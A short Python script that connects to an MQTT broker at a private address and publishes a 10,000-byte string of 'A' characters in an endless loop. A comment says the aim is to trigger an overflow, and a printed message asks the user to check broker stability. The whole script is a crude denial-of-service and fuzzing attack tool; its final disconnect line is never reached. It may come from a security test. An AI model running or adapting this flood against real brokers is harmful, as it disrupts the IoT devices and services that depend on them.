import paho.mqtt.client as mqtt

BROKER = "192.168.115.228"
TOPIC = "6050/data"

PAYLOAD = "A" * 10000  # Large payload to trigger overflow

client = mqtt.Client()
client.connect(BROKER, 1883, 60)
while True:
    client.publish(TOPIC, PAYLOAD)
    print("[+] Sent large payload. Check broker stability.")
client.disconnect()
